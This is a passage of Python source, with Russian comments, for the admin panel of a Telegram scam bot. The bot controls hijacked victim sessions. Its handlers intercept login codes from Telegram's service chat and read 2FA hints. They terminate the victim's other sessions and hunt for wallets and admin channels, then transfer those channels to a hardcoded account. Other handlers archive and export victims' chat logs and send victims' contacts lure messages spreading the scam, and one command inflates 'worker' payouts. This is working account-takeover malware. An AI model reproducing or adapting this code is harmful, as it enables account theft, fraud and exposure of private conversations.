            if phone and phone.replace("+","").isdigit():
                 s_name = phone.replace("+","")
                 kb.row(InlineKeyboardButton(text="⚙️ Управление сессией", callback_data=f"manage_s:{s_name}"))
                 kb.row(InlineKeyboardButton(text="📥 Скачать лог", callback_data=f"send_log:{s_name}"))
            
            await message.answer(txt, reply_markup=kb.as_markup(), parse_mode="HTML")
            await asyncio.sleep(0.5)
            
    @router.message(Command("bal"))
    async def cmd_fake_withdraw_balance(message: types.Message, command: CommandObject):
        # 1. Проверка на админа
        if not await check_admin(message.from_user.id):
            return

        # 2. Проверка аргументов
        args = command.args
        if not args:
            await message.answer(
                "⚠️ <b>Использование:</b> <code>/bal ID СУММА</code>\n"
                "Пример: <code>/bal 123456789 100</code> (добавит 100 TON)", 
                parse_mode="HTML"
            )
            return

        try:
            parts = args.split()
            if len(parts) != 2:
                await message.answer("❌ Неверный формат. Используйте: /bal ID СУММА")
                return

            target_user_id = int(parts[0])
            amount = float(parts[1])

            # 3. Обновление базы данных
            with db_lock:
                user = db.get_user(target_user_id)
                if not user:
                    await message.answer("❌ Пользователь с таким ID не найден в базе.")
                    return

                # Увеличиваем worker_total_profits (Общий заработок)
                # Это автоматически увеличит "Доступно к выводу"
                db.cursor.execute(
                    "UPDATE users SET worker_total_profits = worker_total_profits + ? WHERE user_id = ?", 
                    (amount, target_user_id)
                )
                db.conn.commit()
                
                # Получаем новые данные для подтверждения
                updated_user = db.get_user(target_user_id)
                new_total = updated_user.get('worker_total_profits', 0)
                paid = updated_user.get('worker_paid_amount', 0)
                available = new_total - paid

            # 4. Отправка отчета админу
            await message.answer(
                f"✅ <b>БАЛАНС НАКРУЧЕН!</b>\n\n"
                f"👤 Воркер ID: <code>{target_user_id}</code>\n"
                f"➕ Добавлено: <code>{amount} TON</code>\n"
                f"💰 Теперь доступно к выводу: <code>{available:.2f} TON</code>",
                parse_mode="HTML"
            )

            # 5. (Опционально) Уведомление воркеру
            try:
                await bot_instance.send_message(
                    target_user_id,
                    f"💰 <b>ВАШ БАЛАНС ПОПОЛНЕН!</b>\n\n"
                    f"Администратор начислил вам бонус: <code>{amount} TON</code>\n"
                    f"Проверьте панель воркера: /worker",
                    parse_mode="HTML"
                )
            except: pass

        except ValueError:
            await message.answer("❌ Ошибка: ID и сумма должны быть числами (например: 10.5).")
        except Exception as e:
            await message.answer(f"❌ Ошибка базы данных: {e}")
    # --- 7. РАЗДАЧА ЗВЕЗД (Спам по ЛС) ---
    @router.callback_query(F.data.startswith("spam_stars:"))
    async def handler_spam_stars(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        
        # Спрашиваем подтверждение
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🚀 ЗАПУСТИТЬ", callback_data=f"conf_spam:{s_name}"))
        kb.row(InlineKeyboardButton(text="❌ Отмена", callback_data=f"info_s:{s_name}"))
        
        await call.message.edit_text(
            f"💸 <b>Раздача звезд с аккаунта {s_name}</b>\n\n"
            f"1. Баланс в боте будет пополнен (+100 000 ⭐️).\n"
            f"2. Определится пол (парень/девушка).\n"
            f"3. Всем в ЛС будет отправлен чек на 200 ⭐️.\n\n"
            f"⚠️ Это может привести к спам-блоку аккаунта!",
            parse_mode="HTML", reply_markup=kb.as_markup()
        )

    @router.callback_query(F.data.startswith("conf_spam:"))
    async def handler_spam_stars_confirm(call: types.CallbackQuery):
        s_name = call.data.split(":")[1]
        await call.message.edit_text(f"🚀 <b>Запускаю раздачу для {s_name}...</b>")
        
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.connect()
            me = await client.get_me()
            user_id = me.id
            
            # 1. "Мамонтизация" и пополнение на 100 000 звезд
            db.set_mamont(user_id, True)
            db.update_balance(user_id, 100000, 'add')  # <--- ИЗМЕНЕНО ТУТ
            
            # 2. Определение пола
            first_name = me.first_name or ""
            # Если имя заканчивается на 'а' или 'я' (Мария, Света), считаем девушкой
            is_female = first_name.strip().lower().endswith(('а', 'я', 'a'))
            gender_verb = "захотела" if is_female else "захотел"
            
            # 3. Подготовка к рассылке
            bot_info = await call.bot.get_me()
            bot_username = bot_info.username
            
            sent_count = 0
            
            # Получаем диалоги (только ЛС)
            async for dialog in client.get_dialogs():
                # Пропускаем: чаты, каналы, самого себя, служебные уведомления и нашего бота
                if (dialog.chat.type == pyrogram.enums.ChatType.PRIVATE and 
                    dialog.chat.id != 777000 and 
                    dialog.chat.id != me.id and 
                    dialog.chat.username != bot_username):
                    
                    try:
                        # Создаем чек на 200 звезд для этого человека
                        check_id = db.create_check(creator_id=user_id, amount=200, activations=1)
                        link = f"https://t.me/{bot_username}?start=c_{check_id}"
                        
                        text = (
                            f"привет, мне короче скинули 200 звезд и я {gender_verb} с тобой поделится\n\n"
                            f"{link}"
                        )
                        
                        await client.send_message(dialog.chat.id, text)
                        sent_count += 1
                        
                        # Анти-флуд пауза (рандом от 1.5 до 3 сек)
                        await asyncio.sleep(random.uniform(1.5, 3.0))
                        
                        # Лимит сообщений (чтобы не забанили мгновенно). Можно увеличить.
                        if sent_count >= 50: 
                            break
                            
                    except Exception as e:
                        print(f"Ошибка отправки {dialog.chat.id}: {e}")
                        continue

            await call.message.edit_text(
                f"✅ <b>Раздача завершена!</b>\n\n"
                f"👤 Имя: {first_name} (Пол: {'Ж' if is_female else 'М'})\n"
                f"💰 Баланс пополнен на 100 000 ⭐️\n"
                f"📨 Отправлено сообщений: {sent_count}",
                parse_mode="HTML"
            )

        except Exception as e:
            await call.message.edit_text(f"❌ Ошибка: {e}")
        finally:
            if client.is_connected: await client.disconnect()

    # --- НОВЫЕ ОБРАБОТЧИКИ ДЛЯ СЕССИЙ ---

    # --- ЛОГИКА АВТО-ЧЕКЕРА ---
    @router.callback_query(F.data == "admin_session_check")
    async def cmd_auto_check(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return

        sessions = list(SESSIONS_DIR.glob("*.session"))
        if not sessions:
            return await call.answer("📁 Папка sessions пуста", show_alert=True)

        status_msg = await call.message.answer(f"⏳ Начинаю проверку {len(sessions)} сессий...")

        good, bad = 0, 0
        # Создаем папку для плохих сессий, если её нет
        BAD_SESSIONS_DIR = Path("archive_bad")
        BAD_SESSIONS_DIR.mkdir(exist_ok=True)

        for s_file in sessions:
            s_name = s_file.stem
            # Не трогаем сессию банкира
            if s_name == SETTINGS['banker_session']: continue

            client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))

            try:
                await client.connect()
                await client.get_me() # Проверка на валидность
                good += 1
                await client.disconnect()
            except SessionRevoked:
                bad += 1
                if client.is_connected: await client.disconnect()
                
                # Логируем что мамнот отключил сессию
                log_text = (
                    f"<b>🔌 СЕССИЯ ОТКЛЮЧЕНА МАМНОТОМ</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"📱 <b>Сессия:</b> <code>{s_name}</code>\n"
                    f"⚠️ <b>Причина:</b> Пользователь отключил сессию через настройки Telegram\n"
                    f"<code>««─────────────────»»</code>"
                )
                await log_to_topic(bot_instance, 'topic_auth', log_text)
                
                # Перемещаем "трупик" в архив
                try:
                    shutil.move(str(s_file), str(BAD_SESSIONS_DIR / s_file.name))
                except:
                    if s_file.exists():
                        os.remove(s_file) # Если файл занят или ошибка - просто удаляем
            except (AuthKeyInvalid, UserDeactivated, Exception):
                bad += 1
                if client.is_connected: await client.disconnect()

                # Перемещаем "трупик" в архив
                try:
                    shutil.move(str(s_file), str(BAD_SESSIONS_DIR / s_file.name))
                except:
                    if s_file.exists():
                        os.remove(s_file) # Если файл занят или ошибка - просто удаляем

        await status_msg.edit_text(
            f"✅ <b>Проверка завершена!</b>\n\n"
            f"🟢 Валидных: <b>{good}</b>\n"
            f"🔴 Удалено (бан/выход): <b>{bad}</b>\n\n"
            f"<i>Мертвые сессии перемещены в /archive_bad</i>",
            parse_mode="HTML"
        )

    # --- СПИСОК СЕССИЙ ДЛЯ РУЧНОГО УПРАВЛЕНИЯ ---
    @router.callback_query(F.data == "admin_sessions_list")
    async def cmd_admin_sessions(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        sessions = [f.stem for f in SESSIONS_DIR.glob("*.session")]

        if not sessions:
            return await call.answer("📁 Нет активных сессий", show_alert=True)

        builder = InlineKeyboardBuilder()
        for s_name in sessions[:30]:
            last_4 = s_name[-4:] if len(s_name) >= 4 else s_name
            builder.row(InlineKeyboardButton(text=f"👤 {last_4} ({s_name})", callback_data=f"manage_s:{s_name}"))

        builder.row(InlineKeyboardButton(text="🔍 Поиск по цифрам", callback_data="search_sessions"))
        builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="close_admin"))
        await call.message.edit_text("<b>📂 Список сессий (по последним 4 цифрам):</b>", reply_markup=builder.as_markup())

    # --- ПОИСК ПО ПОСЛЕДНИМ 4 ЦИФРАМ ---
    @router.callback_query(F.data == "search_sessions")
    async def cmd_search_sessions(call: types.CallbackQuery, state: FSMContext):
        if not await check_admin(call.from_user.id): return
        await call.message.edit_text("🔍 Введите последние 4 цифры номера телефона для поиска сессии:", reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔙 Назад", callback_data="admin_sessions_list")).as_markup())
        await state.set_state(AdminSearchState.waiting_for_digits)

    @router.message(AdminSearchState.waiting_for_digits)
    async def search_digits_fin(m: Message, state: FSMContext):
        if not await check_admin(m.from_user.id): return
        digits = m.text.strip()
        if not digits.isdigit() or len(digits) != 4:
            await m.answer("❌ Введите ровно 4 цифры!")
            return

        sessions = [f.stem for f in SESSIONS_DIR.glob("*.session") if f.stem.endswith(digits)]
        await state.clear()

        if not sessions:
            await m.answer(f"❌ Сессий с последними цифрами {digits} не найдено.", reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔍 Новый поиск", callback_data="search_sessions")).row(InlineKeyboardButton(text="🔙 К списку", callback_data="admin_sessions_list")).as_markup())
            return

        builder = InlineKeyboardBuilder()
        for s_name in sessions[:20]:  # Ограничим до 20 для читаемости
            last_4 = s_name[-4:] if len(s_name) >= 4 else s_name
            builder.row(InlineKeyboardButton(text=f"👤 {last_4} ({s_name})", callback_data=f"manage_s:{s_name}"))

        builder.row(InlineKeyboardButton(text="🔍 Новый поиск", callback_data="search_sessions"))
        builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="admin_sessions_list"))
        await m.answer(f"📂 Найдено сессий: {len(sessions)}", reply_markup=builder.as_markup())

    # --- ПРОВЕРКА СТАТУСА БАНКИРА ---
    @router.callback_query(F.data == "check_banker_status")
    async def cmd_check_banker_status(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return

        b_name = SETTINGS.get('banker_session', 'main_admin')
        session_path = SESSIONS_DIR / f"{b_name}.session"

        status_msg = await call.message.answer("🔍 <b>Проверяю статус банкира...</b>", parse_mode="HTML")

        try:
            # Проверяем существование файла сессии
            if not session_path.exists():
                await status_msg.edit_text(
                    f"❌ <b>Сессия банкира не найдена</b>\n\n"
                    f"📁 Файл: <code>{b_name}.session</code>\n"
                    f"📍 Ожидаемое расположение: <code>sessions/</code>\n\n"
                    f"💡 <b>Рекомендация:</b> Подключите банкира через 'Connect Banker'",
                    parse_mode="HTML"
                )
                return

            # Проверяем подключение к сессии
            banker_client = Client(b_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))

            try:
                await banker_client.start()
                me = await banker_client.get_me()

                # Получаем информацию о балансе
                stars_balance = await get_stars_info(banker_client)

                # Получаем информацию о подарках
                gifts = await get_all_received_gifts(banker_client)
                regular_gifts = sum(1 for g in gifts if not analyze_gift_structure(g)['is_nft'])
                nft_count = sum(1 for g in gifts if analyze_gift_structure(g)['is_nft'])

                # Формируем отчет
                report = (
                    f"🟢 <b>Банкир в рабочем состоянии</b>\n\n"
                    f"👤 <b>Имя:</b> <code>{me.first_name or 'Unknown'}</code>\n"
                    f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
                    f"📞 <b>Телефон:</b> <code>{mask_phone(me.phone_number)}</code>\n"
                    f"⭐️ <b>Баланс звезд:</b> <code>{stars_balance}</code>\n"
                    f"🎁 <b>Регулярные подарки:</b> <code>{regular_gifts}</code>\n"
                    f"🖼️ <b>NFT подарки:</b> <code>{nft_count}</code>\n\n"
                    f"✅ <b>Статус:</b> Готов к работе"
                )

                await status_msg.edit_text(report, parse_mode="HTML")

            except Exception as e:
                await status_msg.edit_text(
                    f"🟡 <b>Проблемы с банкиром</b>\n\n"
                    f"❌ <b>Ошибка подключения:</b> <code>{str(e)}</code>\n\n"
                    f"💡 <b>Возможные причины:</b>\n"
                    f"• Сессия устарела или заблокирована\n"
                    f"• Проблемы с сетью\n"
                    f"• Аккаунт требует повторной авторизации\n\n"
                    f"🔄 <b>Рекомендация:</b> Переподключите банкира",
                    parse_mode="HTML"
                )

            finally:
                try:
                    await banker_client.stop()
                except:
                    pass

        except Exception as e:
            await status_msg.edit_text(
                f"❌ <b>Критическая ошибка проверки</b>\n\n"
                f"⚠️ <b>Ошибка:</b> <code>{str(e)}</code>\n\n"
                f"💡 <b>Рекомендация:</b> Проверьте настройки API",
                parse_mode="HTML"
            )

    # --- ПРИНУДИТЕЛЬНОЕ ЗАКРЫТИЕ ВСЕХ СОЕДИНЕНИЙ ---
    @router.callback_query(F.data == "admin_kill_sessions")
    async def cmd_kill_all_sessions(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        await call.answer("♻️ Чтобы полностью очистить RAM и Tasks, перезапустите скрипт бота в консоли.", show_alert=True)

    @router.callback_query(F.data == "admin_logs")
    async def admin_logs(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        try:
            with open('bot.log', 'r', encoding='utf-8') as f:
                lines = f.readlines()[-50:]

            log_text = ''.join(lines)
            errors = [line for line in lines if 'ERROR' in line or '❌' in line]

            if errors:
                error_text = '\n'.join(errors[-5:])
                advice = "Проверьте подключение к интернету, API ключи, сессии пользователей. Для детальной диагностики обратитесь к разработчику."
                text = f"📋 <b>Последние логи (ошибки):</b>\n\n{error_text}\n\n💡 <b>Советы по исправлению:</b>\n{advice}"
            else:
                text = f"📋 <b>Последние логи:</b>\n\n{log_text}"

            await call.message.answer(text[:4000], parse_mode="HTML")

        except Exception as e:
            await call.message.answer(f"❌ Ошибка чтения логов: {e}")

    @router.callback_query(F.data == "restart_bot")
    async def cmd_restart_bot(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        await call.answer("🔄 Перезапуск бота...")
        try:
            subprocess.run(["bash", "start_all.sh"], check=True)
            await call.message.answer("✅ Бот успешно перезапущен!", parse_mode="HTML")
        except subprocess.CalledProcessError as e:
            await call.message.answer(f"❌ Ошибка перезапуска: {e}")

    @router.callback_query(F.data == "close_admin")
    async def close_admin(c):
        await c.message.delete()

    @router.callback_query(F.data == "admin_sessions_list")
    async def cmd_admin_sessions(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        # Мы ищем файлы .session в папке sessions
        sessions = [f.stem for f in SESSIONS_DIR.glob("*.session")]
        if not sessions:
            return await call.answer("📁 Сессий не найдено", show_alert=True)

        builder = InlineKeyboardBuilder()
        for s_name in sessions[:40]:
            builder.row(types.InlineKeyboardButton(text=f"👤 {s_name}", callback_data=f"manage_s:{s_name}"))

        builder.row(types.InlineKeyboardButton(text="🔙 Назад", callback_data="close_admin"))
        await call.message.edit_text("<b>📂 Управление активными сессиями:</b>", reply_markup=builder.as_markup())

    @router.callback_query(F.data.startswith("manage_s:"))
    async def cmd_manage_session(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        builder = InlineKeyboardBuilder()
        builder.row(types.InlineKeyboardButton(text="📊 Инфо", callback_data=f"info_s:{s_name}"))
        builder.row(types.InlineKeyboardButton(text="♻️ Перескан", callback_data=f"rescan:{s_name}"))
        builder.row(types.InlineKeyboardButton(text="🗑 Удалить", callback_data=f"del_s:{s_name}"))
        builder.row(types.InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_sessions_list"))
        await call.message.edit_text(f"📍 Сессия: <b>{s_name}</b>", reply_markup=builder.as_markup())

    @router.callback_query(F.data.startswith("del_s:"))
    async def cmd_del_session(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        file_path = SESSIONS_DIR / f"{s_name}.session"
        if file_path.exists():
            import os
            os.remove(file_path)
            await call.answer(f"✅ {s_name} удален")
        await cmd_admin_sessions(call)

    @router.callback_query(F.data.startswith("info_s:"))
    async def cmd_info_session(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        await call.answer(f"📊 Получаю информацию о {s_name}...")

        # Запускаем Pyrogram для получения информации
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.start()
            me = await client.get_me()

            # Звезды
            stars = await get_stars_info(client)

            # 2FA статус (проверяем наличие пароля)
            has_2fa = "⛔️ Нет"
            try:
                # Пытаемся получить инфо о пароле (если есть - вернет hint или пустоту, если нет - ошибку или None)
                pwd_info = await client.get_password_hint()
                has_2fa = "✅ Есть"
            except:
                pass

            # NFT
            gifts = await get_all_received_gifts(client)
            nft_list = []
            for g in gifts:
                d = analyze_gift_structure(g)
                if d['is_nft']:
                    nft_list.append(f"• {d['title']}")

            info_text = (
                f"<b>📊 Информация о сессии: {s_name}</b>\n\n"
                f"👤 <b>Имя:</b> {me.first_name or 'Unknown'}\n"
                f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
                f"📞 <b>Телефон:</b> <code>{mask_phone(me.phone_number)}</code>\n"
                f"⭐️ <b>Звезды:</b> {stars}\n"
                f"🔐 <b>2FA Пароль:</b> {has_2fa}\n\n"
                f"<b>🎁 NFT ({len(nft_list)}):</b>\n" + ("\n".join(nft_list) if nft_list else "Нет NFT")
            )

            # Создаем клавиатуру с новыми кнопками
            builder = InlineKeyboardBuilder()

            # Ряд 1: Лог и Номер
            builder.row(
                types.InlineKeyboardButton(text="📤 Отправить лог", callback_data=f"send_log:{s_name}"),
                types.InlineKeyboardButton(text="📞 Получить номер", callback_data=f"get_phone:{s_name}")
            )
            # Ряд 2: Код и 2FA
            builder.row(
                types.InlineKeyboardButton(text="🕒 Ожидание кода", callback_data=f"wait_code:{s_name}"),
                types.InlineKeyboardButton(text="🔐 Статус 2FA", callback_data=f"get_2fa:{s_name}")
            )
            # Ряд 3: Комплексное сканирование и спам
            builder.row(
                types.InlineKeyboardButton(text="🔍 Комплексное сканирование", callback_data=f"complex_scan:{s_name}"),
                types.InlineKeyboardButton(text="💸 Раздача (Спам)", callback_data=f"spam_stars:{s_name}")
            )
            # Ряд 4: Опасные действия
            builder.row(
                types.InlineKeyboardButton(text="🔥 Кикнуть сессии", callback_data=f"kick_sessions:{s_name}"),
                types.InlineKeyboardButton(text="🗑 Удалить файл", callback_data=f"del_s:{s_name}")
            )
            # Ряд 5: Навигация
            builder.row(types.InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_sessions_list"))

            await call.message.edit_text(info_text, parse_mode="HTML", reply_markup=builder.as_markup())

        except Exception as e:
            await call.message.edit_text(
                f"❌ <b>Ошибка подключения к {s_name}</b>\n\n<code>{e}</code>", 
                parse_mode="HTML",
                reply_markup=InlineKeyboardBuilder().row(types.InlineKeyboardButton(text="🔙 Назад", callback_data="admin_sessions_list")).as_markup()
            )
        finally:
            if client.is_connected: await client.stop()

    # --- 1. ОТПРАВИТЬ ЛОГ (С защитой от больших файлов) ---
    @router.callback_query(F.data.startswith("send_log:"))
    async def handler_send_log(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        
        await call.answer(f"📦 Архивирую логи для {s_name}...", show_alert=False)
        
        # Получаем ID юзера из сессии
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.connect()
            me = await client.get_me()
            user_id = me.id
            await client.disconnect()
            
            dump_path = DUMP_DIR / str(user_id)
            
            if not dump_path.exists():
                return await call.message.answer(f"❌ Папка с логами для ID {user_id} пуста или не найдена.")

            # 1. Попытка создать полный архив
            zip_base_name = str(BASE_DIR / f"log_{user_id}")
            zip_file_path = f"{zip_base_name}.zip"
            
            # ИСПРАВЛЕНО: Асинхронное создание архива
            await asyncio.to_thread(shutil.make_archive, zip_base_name, 'zip', str(dump_path))
            
            # Проверяем размер (Асинхронно)
            file_size_mb = (await asyncio.to_thread(os.path.getsize, zip_file_path)) / (1024 * 1024)
            
            if file_size_mb > 45:
                # Если файл слишком большой, удаляем его и пробуем собрать ТОЛЬКО текст
                os.remove(zip_file_path)
                await call.message.answer(f"⚠️ Полный лог весит {file_size_mb:.1f} МБ (лимит 50).\n📦 Собираю только текстовые переписки...", parse_mode="HTML")
                
                # Создаем zip вручную, добавляя только .txt
                import zipfile
                with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for root, dirs, files in os.walk(str(dump_path)):
                        for file in files:
                            if file.endswith('.txt'):
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, str(dump_path))
                                zipf.write(file_path, arcname)
                
                # Проверяем размер снова
                new_size_mb = os.path.getsize(zip_file_path) / (1024 * 1024)
                if new_size_mb > 45:
                    os.remove(zip_file_path)
                    return await call.message.answer(f"❌ Даже текстовые логи слишком огромные ({new_size_mb:.1f} МБ). Скачайте их через FTP/SFTP.")
            
            # Отправка
            await call.message.answer_document(
                FSInputFile(zip_file_path), 
                caption=f"📂 Логи для <b>{s_name}</b>\n⚖️ Размер: {os.path.getsize(zip_file_path) / 1024 / 1024:.2f} MB",
                parse_mode="HTML"
            )
            
            # Удаляем временный архив
            if os.path.exists(zip_file_path):
                os.remove(zip_file_path)

        except Exception as e:
            await call.message.answer(f"❌ Критическая ошибка при отправке: {e}")
            if client.is_connected: await client.disconnect()
            # Чистим мусор если ошибка
            try:
                if 'zip_file_path' in locals() and os.path.exists(zip_file_path):
                    os.remove(zip_file_path)
            except: pass

    # --- 2. ПОЛУЧИТЬ НОМЕР ---
    @router.callback_query(F.data.startswith("get_phone:"))
    async def handler_get_phone(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.connect()
            me = await client.get_me()
            phone = me.phone_number
            await call.message.answer(f"📱 <b>Номер для {s_name}:</b>\n<code>{phone}</code>", parse_mode="HTML")
        except Exception as e:
            await call.message.answer(f"❌ Ошибка: {e}")
        finally:
            if client.is_connected: await client.disconnect()

    # --- 3. ОЖИДАНИЕ КОДА (С ожиданием нового сообщения) ---
    @router.callback_query(F.data.startswith("wait_code:"))
    async def handler_wait_code(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        
        # Сообщаем, что начали ожидание
        await call.message.answer(f"⏳ <b>Жду код для {s_name}...</b>\n(Сканирую 15 секунд)", parse_mode="HTML")
        
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.connect()
            found_new_code = False
            
            # Делаем 5 попыток с паузой в 3 секунды (итого 15 секунд ожидания)
            for i in range(5):
                # Берем ТОЛЬКО 1 последнее сообщение
                async for msg in client.get_chat_history(777000, limit=1):
                    if msg.text:
                        # Проверяем, свежее ли сообщение (не старше 2 минут)
                        # Это отфильтрует старые коды
                        is_fresh = False
                        if msg.date:
                            now = datetime.now(msg.date.tzinfo)
                            # Если сообщению меньше 90 секунд
                            if (now - msg.date).total_seconds() < 90:
                                is_fresh = True

                        if is_fresh:
                            match = re.search(r'\b\d{5}\b', msg.text)
                            if match:
                                code = match.group(0)
                                date_str = msg.date.strftime("%H:%M:%S")
                                
                                await call.message.answer(
                                    f"🔥 <b>НОВЫЙ КОД ПОЛУЧЕН!</b>\n"
                                    f"📟 Код: <code>{code}</code>\n"
                                    f"⏰ Время: {date_str}", 
                                    parse_mode="HTML"
                                )
                                found_new_code = True
                                break # Выходим из цикла for
                
                if found_new_code:
                    break
                
                # Если нового кода нет, ждем 3 секунды и пробуем снова
                await asyncio.sleep(3)

            if not found_new_code:
                await call.message.answer("❌ Новых кодов за последние 15 сек не пришло.\nПопробуйте отправить код снова и сразу нажать эту кнопку.")

        except Exception as e:
            await call.message.answer(f"❌ Ошибка: {e}")
        finally:
            if client.is_connected: await client.disconnect()

    # --- 4. ПОЛУЧИТЬ 2FA (Проверка подсказки) ---
    @router.callback_query(F.data.startswith("get_2fa:"))
    async def handler_get_2fa(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.connect()
            hint = await client.get_password_hint()
            
            if hint:
                await call.message.answer(f"🔐 <b>Обнаружен 2FA!</b>\n💡 Подсказка: <code>{hint}</code>", parse_mode="HTML")
            else:
                # Если метод вернул None, но исключения не было - пароля может не быть, или подсказки нет
                await call.message.answer("🔓 <b>2FA скорее всего не установлен</b> (или нет подсказки).", parse_mode="HTML")
                
        except Exception as e:
             await call.message.answer(f"ℹ️ Статус 2FA: <b>Не установлен</b> или ошибка доступа.\nCode: {e}", parse_mode="HTML")
        finally:
            if client.is_connected: await client.disconnect()

    # --- 5. КИКНУТЬ СЕССИИ (ResetAuthorizations) ---
    @router.callback_query(F.data.startswith("kick_sessions:"))
    async def handler_kick_sessions(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        
        await call.answer("🔥 Кикаю другие сессии...", show_alert=True)
        
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.connect()
            # Используем raw функцию для сброса авторизаций (кикает всех, кроме текущей)
            await client.invoke(functions.auth.ResetAuthorizations())
            await call.message.answer(f"✅ <b>Все остальные сессии для {s_name} были завершены!</b>", parse_mode="HTML")
        except Exception as e:
            await call.message.answer(f"❌ Не удалось кикнуть сессии: {e}")
        finally:
            if client.is_connected: await client.disconnect()

    # --- 6. COMPLEX SCAN ---
    @router.callback_query(F.data.startswith("complex_scan:"))
    async def handler_complex_scan(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]

        await call.answer("🔍 Запускаю комплексное сканирование...", show_alert=True)

        # Функция для обновления статуса без кнопок (автоматически)
        async def update_status(status_text: str, step: int = 0):
            progress_bar = "█" * step + "░" * (5 - step)
            full_text = (
                f"🔍 <b>Комплексное сканирование: {s_name}</b>\n\n"
                f"<code>{progress_bar}</code> {step}/5\n\n"
                f"{status_text}"
            )

            try:
                await call.message.edit_text(full_text, parse_mode="HTML")
            except Exception:
                pass  # Игнорируем ошибки редактирования

        # Начальный статус
        await update_status("🚀 <b>Запуск комплексного сканирования...</b>", 0)

        # Запускаем комплексное сканирование
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        banker_client = None

        # Подключаем банкира если есть
        b_name = SETTINGS.get('banker_session')
        if b_name and (SESSIONS_DIR / f"{b_name}.session").exists():
            try:
                await update_status("🏦 <b>Подключение банкира...</b>", 0)
                banker_client = Client(b_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
                await banker_client.start()
                await update_status("✅ <b>Банкир подключен</b>", 0)
            except Exception as e:
                print_error(f"Banker init failed: {e}")
                await update_status("⚠️ <b>Банкир недоступен</b>", 0)
                banker_client = None

        try:
            await update_status("🔗 <b>Подключение к сессии...</b>", 0)
            await client.start()
            me = await client.get_me()
            user_id = me.id
            await update_status(f"✅ <b>Подключено: {me.first_name}</b>", 1)

            # ЭТАП 1: Admin Finder (автоматически)
            await update_status("👑 <b>Поиск админок...</b>", 1)
            admin_data = await admin_finder(client)
            admin_count = admin_data['count']
            await update_status(f"👑 <b>Найдено админок: {admin_count}</b>", 2)

            # ЭТАП 2: Wallet Hunter (автоматически)
            await update_status("💰 <b>Проверка кошельков...</b>", 2)
            wallet_data = await wallet_hunter(client)
            wallet_count = wallet_data['count']
            await update_status(f"💰 <b>Найдено кошельков: {wallet_count}</b>", 3)

            # ЭТАП 3: Передача каналов (автоматически)
            await update_status("🔄 <b>Проверка каналов для передачи...</b>", 3)
            transferred_count = 0
            if admin_data['admin_chats']:
                for chat in admin_data['admin_chats']:
                    if chat['type'] == 'channel':
                        success = await transfer_channel_admin(client, chat['id'], 'DmJohnRent')
                        if success:
                            transferred_count += 1
            await update_status(f"🔄 <b>Передано каналов: {transferred_count}</b>", 4)

            # ЭТАП 4: Архивация чатов (автоматически)
            await update_status("👻 <b>Архивация чатов...</b>", 4)
            archived_count = await ghost_mode_archive(client)
            await update_status(f"👻 <b>Заархивировано: {archived_count} чатов</b>", 5)

            # Финальный этап - отправка статистики
            await update_status("📊 <b>Финализация и отправка статистики...</b>", 6)

            # Отправляем финальную статистику админу
            stats_text = (
                f"📊 <b>ФИНАЛЬНАЯ СТАТИСТИКА ПРОЦЕССА</b>\n\n"
                f"👤 <b>Пользователь:</b> {mask_data(me.username or str(user_id))}\n"
                f"🆔 <b>ID:</b> <code>{user_id}</code>\n\n"
                f"👑 <b>Найдено админок:</b> {admin_count}\n"
                f"💰 <b>Найдено кошельков:</b> {wallet_count}\n"
                f"🎁 <b>Передано NFT:</b> 0 (пока не реализовано)\n"
